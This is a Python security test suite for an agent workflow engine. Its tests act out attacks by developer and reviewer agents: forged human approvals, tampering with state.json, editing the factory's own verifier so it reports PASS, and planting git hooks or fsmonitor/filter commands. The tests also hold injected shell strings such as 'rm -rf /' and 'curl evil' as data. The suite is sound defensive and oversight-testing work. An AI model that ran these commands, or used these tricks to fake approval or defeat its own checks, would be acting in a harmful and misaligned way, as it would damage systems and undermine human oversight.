"""Core Acceptance Suite, SECURITY category: attacks on the core, and what holds.

Every test is one attack, stated as the defended behaviour. An attack that is *open* - a
real hole whose fix belongs to another module's owner - is an `expectedFailure` naming the
finding: it keeps the suite honest (an unexpected success counts as a failure in
`wgf test-core`, so fixing the hole forces the marker off) without pretending the hole is
closed.

    python3 -m unittest discover -s scripts/tests -p test_core_security.py

Categories: state tampering, fake approval, identifiers and paths, command construction,
reviewer isolation, false PASS, loops, silent failures, concurrency, orphaned processes,
coupling. The threat model is an agent (developer or reviewer) with the Factory user's file
access, and artifact content an agent wrote. A writer who rewrites state.json, the artifact
files and events.jsonl *consistently* is out of scope: nothing local can detect that, and
wgflib/workflow/integrity.py says so.
"""

import json
import os
import re
import shutil
import stat
import subprocess
import sys
import tempfile
import time
import types
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPTS = os.path.dirname(HERE)
for _path in (SCRIPTS, HERE):
    if _path not in sys.path:
        sys.path.insert(0, _path)

from test_develop_module import DevelopCase, FakeRunner, inputs_for, step_with  # noqa: E402
from test_develop_module import context as develop_context  # noqa: E402
from test_develop_module import write_game  # noqa: E402
from test_workflow_engine import CHECKPOINT, LINEAR, LOOP, EngineCase  # noqa: E402
from wgf_develop.developers import CommandDeveloper  # noqa: E402
from wgf_develop.repository import Runner as DevelopRunner  # noqa: E402
from wgf_develop.repository import RunResult as DevelopRunResult  # noqa: E402
from wgf_develop.settings import SettingsError as DevelopSettingsError  # noqa: E402
from wgf_develop.settings import Settings as DevelopSettings  # noqa: E402
from wgf_init.project import DesignError, ProjectMetadata  # noqa: E402
from wgf_review import isolation  # noqa: E402
from wgf_review import verdict as verdicts  # noqa: E402
from wgf_review.settings import Settings as ReviewSettings  # noqa: E402
from wgf_review.settings import SettingsError as ReviewSettingsError  # noqa: E402
from wgf_review.step import ReviewStep  # noqa: E402
from wgflib import agentenv, gitsafe, guards, paths, procs  # noqa: E402
from wgflib import isolation as kernel_isolation  # noqa: E402
from wgflib.workflow import api as api_module  # noqa: E402
from wgflib.workflow import checkpoint, integrity  # noqa: E402
from wgflib.workflow.api import RunRequest, WorkflowAPI  # noqa: E402
from wgflib.workflow.config import FactoryConfig  # noqa: E402
from wgflib.workflow.contracts import ArtifactContracts  # noqa: E402
from wgflib.workflow.definition import DefinitionError, parse_definition  # noqa: E402
from wgflib.workflow.engine import EngineError  # noqa: E402
from wgflib.workflow.events import Events  # noqa: E402
from wgflib.workflow.model import (  # noqa: E402
    ArtifactOutput,
    ArtifactRef,
    RunStatus,
    StepOutcome,
    StepResult,
)
from wgflib.workflow.step import StepInputs  # noqa: E402
from wgflib.workflow.store import RunLocked, StoreError  # noqa: E402
from wgflib.yamllite import load  # noqa: E402

HAS_GIT = shutil.which("git") is not None
LINUX = sys.platform.startswith("linux") and os.path.isdir("/proc")
PY = sys.executable
SHA = "a" * 40


def read_text(path):
    with open(path, encoding="utf-8") as handle:
        return handle.read()


def read_json(path):
    return json.loads(read_text(path))


SCAFFOLD = read_json(os.path.join(SCRIPTS, "wgflib", "workflow", "fixtures",
                                  "scaffold-record.json"))


def gated(gate):
    return CHECKPOINT.replace("GATE", gate)


class StateCase(EngineCase):
    """EngineCase plus a hand-editor for state.json - the attacker's tool."""

    def state_path(self, run_id):
        return os.path.join(self.store.run_dir(run_id), "state.json")

    def tamper(self, run_id, edit):
        path = self.state_path(run_id)
        with open(path, encoding="utf-8") as handle:
            data = json.load(handle)
        edit(data)
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle)

    def assert_refused(self, engine, run_id, fragment):
        before = read_text(self.state_path(run_id))
        executed = list(self.script.executed())
        with self.assertRaisesRegex(EngineError, fragment):
            engine.resume(run_id)
        self.assertEqual(self.script.executed(), executed, "nothing may run")
        self.assertEqual(read_text(self.state_path(run_id)), before)
        self.assertFalse(self.store.is_held(run_id))


# -- state tampering ------------------------------------------------------------------------


class StateTampering(StateCase):
    """Hand-edited state.json is refused before the engine acts on it (integrity.py)."""

    def blocked_run(self):
        self.script.set("c", StepResult.blocked("stop"))
        engine = self.engine(LINEAR)
        return engine, engine.start()

    def test_a_cursor_naming_no_step_is_refused(self):
        engine, run = self.blocked_run()
        self.tamper(run.run_id, lambda d: d.update(cursor="../../etc"))
        self.assert_refused(engine, run.run_id, "cursor")

    def test_an_unknown_step_status_is_refused(self):
        engine, run = self.blocked_run()
        self.tamper(run.run_id, lambda d: d["steps"]["c"].update(status="APPROVED"))
        self.assert_refused(engine, run.run_id, "not a step status")

    def test_negative_visits_cannot_buy_loop_budget(self):
        engine, run = self.blocked_run()
        self.tamper(run.run_id, lambda d: d["steps"]["c"].update(visits=-100))
        self.assert_refused(engine, run.run_id, "visits")

    def test_loop_base_above_visits_is_refused(self):
        engine, run = self.blocked_run()
        self.tamper(run.run_id, lambda d: d["steps"]["c"].update(loop_base=99))
        self.assert_refused(engine, run.run_id, "loop_base")

    def test_an_unknown_run_status_is_refused(self):
        engine, run = self.blocked_run()
        self.tamper(run.run_id, lambda d: d.update(status="RUNNING?"))
        with self.assertRaises(EngineError):
            engine.resume(run.run_id)

    def test_a_completed_run_flipped_back_to_running_has_nothing_to_run(self):
        # COMPLETED -> RUNNING is a legal-looking status; the cursor is gone, so nothing
        # runs. (Setting a cursor as well is a consistent rewrite: out of scope.)
        engine = self.engine(LINEAR)
        run = engine.start()
        self.tamper(run.run_id, lambda d: d.update(status="RUNNING"))
        with self.assertRaisesRegex(EngineError, "no step left"):
            engine.resume(run.run_id)

    def test_a_ref_pointing_at_an_older_versions_file_is_refused(self):
        # Replay: verify fails at v2; point the v2 ref at v1's (passing) file and checksum.
        self.script.set("verify", StepResult(StepOutcome.SUCCESS, artifacts=[
            ArtifactOutput("report", {"verdict": "pass"})]),
            lambda i, c: StepResult(StepOutcome.FAILED, route="fail", retryable=False,
                                    artifacts=[ArtifactOutput("report", {"verdict": "fail"})],
                                    error="defects"))
        self.script.set("release", StepResult.blocked("hold"))
        definition = LOOP.replace("fail: develop", "fail: $fail")
        engine = self.engine(definition)
        first = engine.start()
        self.assertEqual(first.status, RunStatus.BLOCKED)
        run = engine.resume(first.run_id, from_step="verify")
        self.assertEqual(run.status, RunStatus.FAILED)
        self.assertEqual(len(run.artifacts["report"]), 2)

        def replay(data):
            v1, v2 = data["artifacts"]["report"]
            v2.update(location=v1["location"], checksum=v1["checksum"])
            data["status"] = "FAILED"
        self.tamper(run.run_id, replay)
        self.assert_refused(engine, run.run_id, "location")

    def test_deleting_the_newest_ref_to_expose_an_older_pass_is_refused(self):
        self.script.set("verify", StepResult(StepOutcome.SUCCESS, artifacts=[
            ArtifactOutput("report", {"verdict": "pass"})]),
            StepResult(StepOutcome.FAILED, route="fail", retryable=False, error="defects",
                       artifacts=[ArtifactOutput("report", {"verdict": "fail"})]))
        self.script.set("release", StepResult.blocked("hold"))
        engine = self.engine(LOOP.replace("fail: develop", "fail: $fail"))
        first = engine.start()
        run = engine.resume(first.run_id, from_step="verify")
        self.tamper(run.run_id, lambda d: d["artifacts"]["report"].pop())
        self.assert_refused(engine, run.run_id, "does not record")

    def test_an_edited_artifact_file_fails_the_consumer_not_passes_it(self):
        self.script.set("c", StepResult.blocked("stop"))
        engine = self.engine(LINEAR)
        run = engine.start()
        path = os.path.join(self.store.run_dir(run.run_id), "artifacts", "art-b", "v1.json")
        with open(path, "w", encoding="utf-8") as handle:
            json.dump({"forged": True}, handle)
        state = engine.resume(run.run_id)
        self.assertEqual(state.status, RunStatus.FAILED)
        self.assertIn("changed on disk", state.steps["c"].error)

    def test_a_forged_artifact_id_in_state_is_refused(self):
        engine, run = self.blocked_run()

        def forge(data):
            data["artifacts"]["../x"] = data["artifacts"].pop("art-b")
        self.tamper(run.run_id, forge)
        with self.assertRaises((EngineError, StoreError)):
            engine.resume(run.run_id)

    def test_a_truncated_state_file_is_an_error_not_a_fresh_run(self):
        engine, run = self.blocked_run()
        with open(self.state_path(run.run_id), "w", encoding="utf-8") as handle:
            handle.write('{"format": 1, "run_id": ')
        with self.assertRaisesRegex(StoreError, "unreadable"):
            engine.resume(run.run_id)


# -- fake approval --------------------------------------------------------------------------


class FakeApproval(StateCase):
    def waiting_at(self, gate):
        engine = self.engine(gated(gate))
        run = engine.start()
        self.assertEqual(run.status, RunStatus.WAITING)
        return engine, run

    def test_a_decision_injected_into_state_json_answers_nothing(self):
        for gate in ("G2", "G4"):
            with self.subTest(gate=gate):
                engine, run = self.waiting_at(gate)
                self.tamper(run.run_id, lambda d: d["decisions"].update(review={
                    "decision": "approve", "decided_by": "human",
                    "decided_at": "2026-01-01T00:00:00.000Z", "visit": 1}))
                state = engine.resume(run.run_id)
                self.assertEqual(state.status, RunStatus.WAITING)
                self.assertNotIn("design", self.script.executed())
                self.assertTrue(any(e.get("message", "").startswith("decision ignored")
                                    for e in self.events if e["event"] == Events.STEP_LOG))

    def test_a_decision_replayed_from_an_earlier_visit_answers_nothing(self):
        engine, run = self.waiting_at("G2")
        state = engine.resume(run.run_id, decision="rework")  # visit 1 -> back to strategy
        self.assertEqual(state.status, RunStatus.WAITING)
        self.assertEqual(state.steps["review"].visits, 2)
        # The visit-1 decision is still in state; bump its visit to look current.
        self.tamper(run.run_id, lambda d: d["decisions"]["review"].update(
            decision="approve", visit=2))
        state = engine.resume(run.run_id)
        self.assertEqual(state.status, RunStatus.WAITING)
        self.assertNotIn("design", self.script.executed())

    def test_irreversible_gates_never_auto_approve_whatever_the_run_asks(self):
        for gate in ("G4", "G6", "G7"):
            with self.subTest(gate=gate):
                state = self.engine(gated(gate)).start(params={"auto_approve": [gate]})
                self.assertEqual(state.status, RunStatus.WAITING)

    def test_a_gate_spelt_differently_is_not_a_way_around_irreversibility(self):
        for spelling in ("g4", " G4", "G4 "):
            with self.subTest(spelling=spelling):
                self.assertTrue(checkpoint.is_irreversible(spelling))
                self.assertFalse(checkpoint.may_auto_approve(spelling, [spelling]))
        text = CHECKPOINT.replace("gate: GATE", 'gate: "g4"')
        engine = self.engine(text)
        state = engine.start(params={"auto_approve": ["g4"]})
        self.assertEqual(state.status, RunStatus.WAITING)
        state = engine.resume(state.run_id, decision="approve", decided_by="automation")
        self.assertEqual(state.status, RunStatus.WAITING)

    def test_an_unknown_gate_is_never_auto_approved(self):
        state = self.engine(gated("G99")).start(params={"auto_approve": ["G99"]})
        self.assertEqual(state.status, RunStatus.WAITING)

    def test_a_non_human_decision_on_an_irreversible_gate_waits(self):
        engine, run = self.waiting_at("G6")
        state = engine.resume(run.run_id, decision="approve", decided_by="automation")
        self.assertEqual(state.status, RunStatus.WAITING)
        self.assertNotIn("design", self.script.executed())

    def test_a_decision_is_a_plain_label(self):
        engine, run = self.waiting_at("G2")
        for bad in ("approve\n", "a" * 65, "../approve", "approve; rm -rf /", ""):
            with self.subTest(decision=bad), self.assertRaises(EngineError):
                engine.resume(run.run_id, decision=bad)


class DecisionsFromInsideAStep(unittest.TestCase):
    """A developer or reviewer agent that runs `wgf --resume <run> --decision approve` is
    recorded as automation - so G4/G6/G7 refuse it - not as the human the CLI assumes."""

    def test_the_process_tag_marks_a_step_descendant(self):
        self.assertTrue(api_module.spawned_by_a_step({procs.TAG_ENV: "abc"}))
        self.assertTrue(api_module.spawned_by_a_step({procs.LINEAGE_ENV: "abc,def"}))

    def test_an_ancestor_carrying_the_tag_is_found_after_the_env_is_dropped(self):
        proc = tempfile.mkdtemp(prefix="wgf-proc-")
        self.addCleanup(shutil.rmtree, proc, ignore_errors=True)

        def fake(pid, ppid, environ):
            os.makedirs(os.path.join(proc, str(pid)))
            with open(os.path.join(proc, str(pid), "stat"), "w") as handle:
                handle.write(f"{pid} (py (weird) name) S {ppid} 1 1 0\n")
            with open(os.path.join(proc, str(pid), "environ"), "wb") as handle:
                handle.write(environ)
        fake(300, 200, b"PATH=/bin\0")
        fake(200, 100, b"HOME=/h\0")
        fake(100, 1, f"{procs.TAG_ENV}=feed\0PATH=/bin\0".encode())
        self.assertTrue(api_module.spawned_by_a_step({}, proc=proc, pid=300))
        shutil.rmtree(os.path.join(proc, "100"))
        fake(100, 1, b"PATH=/bin\0")
        self.assertFalse(api_module.spawned_by_a_step({}, proc=proc, pid=300))

    def test_this_test_process_is_a_human(self):
        if os.environ.get(procs.TAG_ENV):
            self.skipTest("the suite itself runs inside a Factory step")
        self.assertEqual(api_module.default_decider(), "human")

    def test_an_agent_approving_g4_from_inside_a_step_is_refused_end_to_end(self):
        scratch = tempfile.mkdtemp(prefix="wgf-sec-api-")
        self.addCleanup(shutil.rmtree, scratch, ignore_errors=True)
        workflow = os.path.join(scratch, "kill-gate.workflow.yaml")
        with open(workflow, "w", encoding="utf-8") as handle:
            # G4 is decided on the verified evidence (gates.yaml required_artifacts): a mock
            # verification produces it, so the gate really asks for a decision.
            handle.write("workflow:\n  id: kill-gate\n  version: 1\n  steps:\n"
                         "    - id: verify\n      type: verify\n"
                         "      outputs: [prototype-report, verification-report, qa-report]\n"
                         "    - id: prototype-review\n      type: human-checkpoint\n"
                         "      inputs: [qa-report, verification-report, prototype-report]\n"
                         "      with: {gate: G4, choices: [approve, reject]}\n")
        store = os.path.join(scratch, "store")

        def api():
            return WorkflowAPI(config=FactoryConfig({"storage": {"fsync": False}}),
                               store_dir=store, workflow=workflow)

        run = api().run(RunRequest(mock=True))
        self.assertEqual(run.status, RunStatus.WAITING)
        self.assertEqual(run.trail[-1]["outcome"], "WAITING_FOR_HUMAN")
        # The "agent": a child started the way every step starts children, calling the API
        # exactly as `wgf kill-gate --resume <id> --decision approve` does.
        agent = (f"import sys; sys.path.insert(0, {SCRIPTS!r})\n"
                 "from wgflib.workflow.api import RunRequest, WorkflowAPI\n"
                 "from wgflib.workflow.config import FactoryConfig\n"
                 f"api = WorkflowAPI(config=FactoryConfig({{'storage': {{'fsync': False}}}}),"
                 f" store_dir={store!r}, workflow={workflow!r})\n"
                 f"state = api.run(RunRequest(resume={run.run_id!r}, decision='approve'))\n"
                 "print(state.status)\n")
        done = procs.run([PY, "-c", agent], timeout=60)
        self.assertTrue(done.ok, done.tail())
        self.assertEqual(done.stdout.strip(), RunStatus.WAITING)
        state = api().store.load(run.run_id)
        self.assertEqual(state.decisions["prototype-review"]["decided_by"], "automation")
        # A person, outside any step, can still decide it.
        state = api().run(RunRequest(resume=run.run_id, decision="approve"))
        self.assertEqual(state.status, RunStatus.COMPLETED)
        self.assertEqual(state.decisions["prototype-review"]["decided_by"], "human")


# -- identifiers and paths ------------------------------------------------------------------


class HostileIdentifiers(EngineCase):
    def test_run_ids_cannot_leave_the_store(self):
        for bad in ("../x", "a/b", "x\n", "..", ".hidden", "a\\b", "", "x" * 200):
            with self.subTest(run_id=bad), self.assertRaises(StoreError):
                self.store.run_dir(bad)

    def test_artifact_names_cannot_leave_the_run(self):
        for bad in ("../x", "a/b", "A", "x\n", ".."):
            with self.subTest(name=bad):
                self.script.set("a", StepResult.success([ArtifactOutput("art-a", {"x": 1},
                                                                        name=bad)]))
                state = self.engine(LINEAR).start()
                self.assertEqual(state.status, RunStatus.FAILED)
                self.assertIn("kebab-case", state.steps["a"].error)

    def test_step_ids_types_and_routes_are_plain_tokens(self):
        for field, value in (("id", "../x"), ("type", "os.system('x')"), ("type", "a b"),
                             ("id", "A")):
            text = f"workflow:\n  id: w\n  version: 1\n  steps:\n    - id: a\n      type: a\n"
            text = text.replace(f"{field}: a", f"{field}: {json.dumps(value)}")
            with self.subTest(field=field, value=value), self.assertRaises(DefinitionError):
                parse_definition(load(text), "<test>")

    def test_a_route_to_nowhere_is_a_definition_error(self):
        text = LINEAR.replace("outputs: [art-c]", "outputs: [art-c]\n      on: {failed: nowhere}")
        with self.assertRaisesRegex(DefinitionError, "nowhere"):
            parse_definition(load(text), "<test>")

    def test_a_repository_name_of_dot_dot_is_not_a_checkout(self):
        for bad in ("..", ".", "a/b", "../x", "", "x\n", " x"):
            with self.subTest(name=bad):
                with self.assertRaises(ValueError):
                    paths.checkout_path("/games", bad)
                with self.assertRaises(ReviewSettingsError):
                    ReviewSettings.resolve({}).checkout_for(bad)
                with self.assertRaises(DevelopSettingsError):
                    DevelopSettings.resolve({}, {}).checkout_for(bad)
        self.assertEqual(paths.checkout_path("/games", "neon-drift"), "/games/neon-drift")

    def test_the_review_step_refuses_a_scaffold_record_naming_dot_dot(self):
        result = run_review_step({"repository": {"name": ".."}, "title_id": "x"})
        self.assertEqual(result.outcome, StepOutcome.FAILED)
        self.assertFalse(result.retryable)
        self.assertIn("single directory name", result.error)

    def test_the_scaffold_record_schema_refuses_dot_and_dot_dot(self):
        # repository.name is one directory entry; consumers also refuse it themselves
        # (wgflib.paths.checkout_path), so neither layer alone is relied on.
        self.assertTrue(any("repository" in p for p in scaffold_problems(SCAFFOLD, ".")))
        self.assertTrue(any("repository" in p for p in scaffold_problems(SCAFFOLD, "..")))

    def test_the_scaffold_record_used_above_is_otherwise_valid(self):
        self.assertEqual(scaffold_problems(SCAFFOLD, "neon-drift"), [])

    def test_a_title_id_with_a_trailing_newline_is_not_kebab_case(self):
        design = {"title_id": "neon-drift\n", "consistency": {"status": "pass"}}
        with self.assertRaises(DesignError):
            ProjectMetadata.from_design(design)

    def test_a_verdict_cannot_point_a_blocker_outside_the_repository(self):
        for bad in ("/etc/passwd", "../x", "a/../../x"):
            with self.subTest(file=bad):
                data, problem = parse_verdict({
                    "verdict": "request-changes", "commit": SHA,
                    "blockers": [{"id": "b", "file": bad, "summary": "s",
                                  "severity": "major"}]})
                self.assertIsNone(data)


def scaffold_problems(fixture, name):
    from wgflib.hashing import content_hash
    body = json.loads(json.dumps(fixture))
    body["repository"] = dict(body.get("repository") or {}, name=name)
    content = {"provenance": {
        "artifact_id": "wgf:scaffold-record:mock-title:20260101-01",
        "artifact_type": "scaffold-record", "schema_version": "1.0.0",
        "title_id": "mock-title", "produced_by": {"role": "release", "actor": "automation"},
        "produced_at": "2026-01-01T00:00:00Z", "inputs": [], "content_hash": "",
        "status": "draft"}}
    content.update(body)
    content["provenance"]["content_hash"] = content_hash(content)
    return ArtifactContracts()("scaffold-record", content)


def parse_verdict(data, head=SHA):
    scratch = tempfile.mkdtemp(prefix="wgf-verdict-")
    try:
        path = os.path.join(scratch, "v.json")
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle)
        return verdicts.parse(path, head)
    finally:
        shutil.rmtree(scratch, ignore_errors=True)


class _Logger:
    def __getattr__(self, _name):
        return lambda *a, **k: None


def run_review_step(scaffold, prototype=None, config=None, run_dir=None):
    refs = {t: ArtifactRef(id=t, type=t, version=1, location=f"artifacts/{t}/v1.json",
                           checksum="sha256:0", schema_version="1.0.0")
            for t in ("prototype-report", "scaffold-record")}
    contents = {"prototype-report": prototype or {"build_ref": {"commit_sha": SHA}},
                "scaffold-record": scaffold}
    inputs = StepInputs(refs, lambda ref: contents[ref.type], [])
    context = types.SimpleNamespace(
        config=config or {"review": {"reviewer": {"kind": "command", "argv": ["true"]}}},
        run_dir=run_dir or tempfile.gettempdir(), visit=1, attempt=1, execution=1,
        logger=_Logger())
    step = ReviewStep(types.SimpleNamespace(id="review", type="review", params={},
                                            outputs=["review-report"], inputs=[]))
    return step.execute(inputs, context)


# -- command construction -------------------------------------------------------------------


class CommandConstruction(unittest.TestCase):
    def test_no_module_builds_a_shell_command(self):
        pattern = re.compile(r"shell\s*=\s*True|os\.system\(|os\.popen\(|"
                             r"subprocess\.getoutput\(|subprocess\.getstatusoutput\(")
        offenders = []
        for directory, dirs, files in os.walk(SCRIPTS):
            dirs[:] = [d for d in dirs if d not in ("tests", "__pycache__", "golden")]
            for name in files:
                if name.endswith(".py"):
                    path = os.path.join(directory, name)
                    with open(path, encoding="utf-8") as handle:
                        for number, line in enumerate(handle, 1):
                            if pattern.search(line.split("#", 1)[0]):
                                offenders.append(f"{os.path.relpath(path, SCRIPTS)}:{number}")
        self.assertEqual(offenders, [])

    def test_placeholders_are_substituted_per_argv_element_and_never_reparsed(self):
        seen = {}

        class Runner:
            def run(self, argv, cwd=None, timeout=None):
                seen["argv"], seen["cwd"] = argv, cwd
                return types.SimpleNamespace(timed_out=False, idle_timed_out=False, ok=True,
                                             returncode=0, tail=lambda *a: "")

        hostile = "/tmp/brief {key} $(touch /tmp/pwned); `id` {prompt}.md"
        settings = types.SimpleNamespace(developer={
            "argv": ["agent", "-p", "{prompt}", "--brief", "{brief}", "--repo", "{repo}"],
            "timeout_seconds": 5})
        context = types.SimpleNamespace(idempotency_key="wgf-develop:run:develop",
                                        logger=_Logger())
        outcome = CommandDeveloper(settings, Runner()).develop(hostile, "/games/x; rm -rf /",
                                                               context)
        self.assertEqual(outcome.status, "done")
        argv = seen["argv"]
        self.assertEqual(len(argv), 7)
        self.assertEqual(argv[4], hostile)             # verbatim: no second format pass
        self.assertEqual(argv[6], "/games/x; rm -rf /")
        self.assertIn(hostile, argv[2])
        self.assertNotIn("wgf-develop:run:develop", argv[4])


# -- reviewer isolation ---------------------------------------------------------------------


def _git(root, *args, check=True):
    env = dict(os.environ, GIT_AUTHOR_NAME="t", GIT_AUTHOR_EMAIL="t@t.invalid",
               GIT_COMMITTER_NAME="t", GIT_COMMITTER_EMAIL="t@t.invalid", LC_ALL="C")
    done = subprocess.run(["git", *args], cwd=root, env=env, capture_output=True, text=True)
    if check and done.returncode != 0:
        raise AssertionError(f"git {' '.join(args)}: {done.stderr}")
    return done.stdout


@unittest.skipUnless(HAS_GIT, "git is not installed")
class ReviewerIsolation(unittest.TestCase):
    """What a reviewer can change, and whether it is caught and undone. Each test does what
    a misbehaving reviewer would, between the two snapshots the review step takes."""

    def setUp(self):
        self.scratch = tempfile.mkdtemp(prefix="wgf-sec-review-")
        self.addCleanup(shutil.rmtree, self.scratch, ignore_errors=True)
        self.root = os.path.join(self.scratch, "game")
        self.factory = os.path.join(self.scratch, "factory", "scripts")
        os.makedirs(os.path.join(self.root, "src"))
        os.makedirs(self.factory)
        self.write("src/main.ts", "export const x = 1;\n")
        self.write(".gitignore", "node_modules/\ndist/\n")
        self.write("package.json", "{}\n")
        with open(os.path.join(self.factory, "verify.py"), "w") as handle:
            handle.write("PASS = False\n")
        _git(self.root, "init", "-q")
        _git(self.root, "add", "-A")
        _git(self.root, "commit", "-qm", "init")
        self.write("node_modules/dep/index.js", "module.exports = 1;\n")
        self.git = isolation.Git(self.root)
        self.before = isolation.take(self.git, [self.factory])

    def write(self, relative, text):
        path = os.path.join(self.root, *relative.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text)
        return path

    def violations(self):
        return isolation.diff(self.before, isolation.take(isolation.Git(self.root),
                                                           [self.factory]))

    def assert_caught(self, fragment, restorable=True):
        found = self.violations()
        self.assertTrue(any(fragment in v["path"] for v in found), found)
        restored, problems = isolation.restore(isolation.Git(self.root), self.before,
                                               [self.factory])
        self.assertEqual(restored, restorable, problems)
        if restorable:
            self.assertEqual(self.violations(), [])
        return problems

    def test_an_edit_inside_node_modules_with_mtime_put_back_is_caught(self):
        path = os.path.join(self.root, "node_modules", "dep", "index.js")
        info = os.stat(path)
        time.sleep(0.01)
        with open(path, "w") as handle:
            handle.write("module.exports = 2;\n")  # same size
        os.utime(path, ns=(info.st_atime_ns, info.st_mtime_ns))
        problems = self.assert_caught("node_modules/dep/index.js", restorable=False)
        self.assertTrue(problems)  # its bytes were never kept: a person must look

    def test_another_project_linking_the_same_store_file_is_not_a_write(self):
        # pnpm hard-links node_modules files from its machine-wide store. Another project's
        # install linking the same file moves the shared inode's ctime; nothing was written.
        # Found by the real acceptance run: 10716 "modified" node_modules files, no writer.
        store = os.path.join(self.scratch, "store-file.js")
        with open(store, "w") as handle:
            handle.write("module.exports = 'shared';\n")
        linked = os.path.join(self.root, "node_modules", "shared", "index.js")
        os.makedirs(os.path.dirname(linked))
        os.link(store, linked)
        self.before = isolation.take(self.git, [self.factory])
        time.sleep(0.01)
        os.link(store, os.path.join(self.scratch, "another-project-link.js"))  # ctime moves
        self.assertEqual(self.violations(), [])

    def test_a_write_to_a_hard_linked_file_is_still_caught(self):
        store = os.path.join(self.scratch, "store-file.js")
        with open(store, "w") as handle:
            handle.write("module.exports = 'shared';\n")
        linked = os.path.join(self.root, "node_modules", "shared", "index.js")
        os.makedirs(os.path.dirname(linked))
        os.link(store, linked)
        self.before = isolation.take(self.git, [self.factory])
        time.sleep(0.01)
        with open(linked, "a") as handle:
            handle.write("// tampered\n")
        self.assertTrue(any("node_modules/shared/index.js" in v["path"]
                            for v in self.violations()))

    def test_a_file_added_inside_an_existing_ignored_directory_is_caught_and_removed(self):
        self.write("node_modules/dep/postinstall.js", "require('child_process')\n")
        self.assert_caught("node_modules/dep/postinstall.js")
        self.assertFalse(os.path.exists(os.path.join(self.root, "node_modules", "dep",
                                                     "postinstall.js")))

    def test_deleting_an_ignored_directory_is_a_write(self):
        shutil.rmtree(os.path.join(self.root, "node_modules"))
        self.assertTrue(any(v["path"] == "node_modules" and v["change"] == "deleted"
                            for v in self.violations()))

    def test_a_new_ignored_directory_is_caught_and_removed(self):
        self.write("dist/evil.js", "x\n")
        self.assert_caught("dist")
        self.assertFalse(os.path.exists(os.path.join(self.root, "dist")))

    def test_info_exclude_cannot_hide_a_new_file(self):
        self.write("src/evil.ts", "steal()\n")
        with open(os.path.join(self.root, ".git", "info", "exclude"), "a") as handle:
            handle.write("src/evil.ts\n")
        found = self.violations()
        self.assertTrue(any(v["path"] == ".git/info/exclude" for v in found), found)
        self.assertTrue(any(v["path"] == "src/evil.ts" for v in found), found)
        restored, problems = isolation.restore(isolation.Git(self.root), self.before,
                                               [self.factory])
        self.assertTrue(restored, problems)
        self.assertFalse(os.path.exists(os.path.join(self.root, "src", "evil.ts")))

    def test_a_planted_merge_head_is_caught_and_removed(self):
        with open(os.path.join(self.root, ".git", "MERGE_HEAD"), "w") as handle:
            handle.write(_git(self.root, "rev-parse", "HEAD"))
        self.assert_caught(".git/MERGE_HEAD")
        self.assertFalse(os.path.exists(os.path.join(self.root, ".git", "MERGE_HEAD")))

    def test_a_hook_is_caught_and_removed(self):
        hook = os.path.join(self.root, ".git", "hooks", "pre-commit")
        with open(hook, "w") as handle:
            handle.write("#!/bin/sh\ncurl evil\n")
        os.chmod(hook, 0o755)
        self.assert_caught(".git/hooks/pre-commit")
        self.assertFalse(os.path.exists(hook))

    def test_a_symlink_replacing_a_tracked_file_is_caught_and_undone(self):
        path = os.path.join(self.root, "src", "main.ts")
        os.remove(path)
        os.symlink("/etc/hostname", path)
        self.assert_caught("src/main.ts")
        self.assertFalse(os.path.islink(path))

    def test_a_chmod_only_change_is_caught(self):
        path = os.path.join(self.root, "src", "main.ts")
        os.chmod(path, 0o755)
        self.assert_caught("src/main.ts")
        self.assertFalse(os.stat(path).st_mode & stat.S_IXUSR)

    def test_an_edit_to_the_factorys_own_code_is_caught_and_restored(self):
        path = os.path.join(self.factory, "verify.py")
        with open(path, "w") as handle:
            handle.write("PASS = True\n")
        self.assert_caught("verify.py")
        with open(path) as handle:
            self.assertEqual(handle.read(), "PASS = False\n")

    def test_the_factory_code_and_gates_are_guarded_by_default(self):
        guarded = ReviewSettings.resolve({}).guarded_paths
        for part in ("core", "scripts", "bin", os.path.join("workspace", "config")):
            self.assertIn(os.path.join(paths.ROOT, part), guarded)
        self.assertTrue(ReviewSettings.resolve({}).fingerprint_ignored)

    def test_config_the_reviewer_writes_runs_no_command_in_the_factory(self):
        marker = os.path.join(self.scratch, "PWNED")
        _git(self.root, "config", "core.fsmonitor", f"touch {marker}; false")
        with open(os.path.join(self.root, ".git", "info", "attributes"), "w") as handle:
            handle.write("* filter=evil\n")
        _git(self.root, "config", "filter.evil.process", f"sh -c 'touch {marker}; exit 1'")
        _git(self.root, "config", "filter.evil.clean", f"sh -c 'touch {marker}; cat'")
        os.utime(os.path.join(self.root, "src", "main.ts"), None)  # stat-dirty
        self.assert_caught(".git/config")
        self.assertFalse(os.path.exists(marker), "the reviewer's config ran a command")

    def test_config_a_developer_planted_before_the_review_runs_nothing_either(self):
        marker = os.path.join(self.scratch, "PWNED")
        _git(self.root, "config", "core.fsmonitor", f"touch {marker}; false")
        git = isolation.Git(self.root)
        self.assertEqual(git.dirty(), [])
        isolation.take(git, [])
        self.assertFalse(os.path.exists(marker))

    def test_core_worktree_cannot_aim_the_restore_at_another_directory(self):
        victim = os.path.join(self.scratch, "victim")
        os.makedirs(victim)
        with open(os.path.join(victim, "precious.txt"), "w") as handle:
            handle.write("keep me\n")
        _git(self.root, "config", "core.worktree", victim)
        self.write("src/main.ts", "changed\n")
        restored, problems = isolation.restore(isolation.Git(self.root), self.before,
                                               [self.factory])
        self.assertTrue(restored, problems)
        self.assertTrue(os.path.exists(os.path.join(victim, "precious.txt")))
        self.assertEqual(os.listdir(victim), ["precious.txt"])
        self.assertNotIn("worktree", _git(self.root, "config", "--list", "--local"))

    def test_hardened_git_ignores_redirecting_environment(self):
        env = gitsafe.safe_env({"GIT_DIR": "/elsewhere", "GIT_WORK_TREE": "/x",
                                "GIT_CONFIG_COUNT": "1", "GIT_CONFIG_KEY_0": "core.fsmonitor",
                                "GIT_CONFIG_VALUE_0": "evil", "PATH": "/bin"})
        self.assertEqual(env, {"PATH": "/bin"})
        argv = gitsafe.hardened(["status"], self.root, "/g", drivers=["x.y"])
        self.assertIn("core.fsmonitor=false", argv)
        self.assertIn("filter.x.y.process=", argv)
        self.assertEqual(argv[-3:], ["--git-dir=/g", f"--work-tree={self.root}", "status"])


# -- the developer's boundary ---------------------------------------------------------------


class DeveloperBoundary(DevelopCase):
    """What a developer agent can do to the Factory, and what holds. Each developer here
    is `on_develop`: it runs inside the develop step, where an agent host would, and does
